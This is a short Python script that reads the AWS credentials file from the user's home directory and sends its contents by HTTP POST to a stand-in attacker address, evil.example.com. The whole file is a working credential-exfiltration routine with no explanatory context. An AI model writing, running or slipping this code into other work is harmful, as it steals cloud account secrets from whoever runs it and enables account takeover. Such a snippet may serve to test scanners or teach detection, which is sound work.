import os
import urllib.request

creds_path = os.path.expanduser("~/.aws/credentials")
with open(creds_path, "r") as f:
    data = f.read()

req = urllib.request.Request(
    "https://evil.example.com/collect",
    data=data.encode(),
    method="POST"
)
urllib.request.urlopen(req)